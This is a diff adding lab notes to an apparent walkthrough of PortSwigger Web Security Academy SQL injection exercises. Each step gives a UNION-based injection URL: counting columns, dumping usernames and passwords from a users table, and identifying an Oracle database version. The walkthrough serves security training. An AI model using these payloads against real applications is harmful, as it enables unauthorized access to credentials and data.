@@ -39,3 +39,28 @@ Again, start with trying the first column, and move further untill you don't get
 `https://xxxxxx.web-security-academy.net/filter?category=Pets' UNION SELECT NULL,'abc',NULL--`
 
 
+## LAB : SQL injection UNION attack, retrieving data from other tables
+
+Building on the previous lab. First check how many columns we need to return:\
+`https://xxxxxx.web-security-academy.net/filter?category=Pets' UNION SELECT NULL,NULL--`
+
+Check which columns can contain strings (and where you see the 1st column, and where the 2nd):\
+`https://xxxxxx.web-security-academy.net/filter?category=Pets' UNION SELECT 'abc','xyz'--`
+
+Now we can print all usernames with their passwords as a new item:\
+`https://xxxxxx.web-security-academy.net/filter?category=Pets' UNION SELECT username,password FROM users--`
+
+## LAB : SQL injection attack, querying the database type and version on Oracle
+
+Trying what we did in the previous 2 labs doesn't work here. No matter how many *NULL*s we add, we keep getting errors:\
+`https://xxxxxx.web-security-academy.net/filter?category=Pets' UNION SELECT NULL,NULL,NULL--`
+
+That's because in this case there's no MS-SQL as backend. But an Oracle database (as suggested in the title of the lab)\
+For Oracle DB's we have to do the following:\
+`https://xxxxxx.web-security-academy.net/filter?category=Pets' UNION SELECT NULL,NULL FROM dual--`
+
+Now that this doens't return an error, we can actually check which database type we are dealing with:\
+`https://xxxxxx.web-security-academy.net/filter?category=Pets' UNION SELECT NULL,banner FROM v$version--`
+
+
+
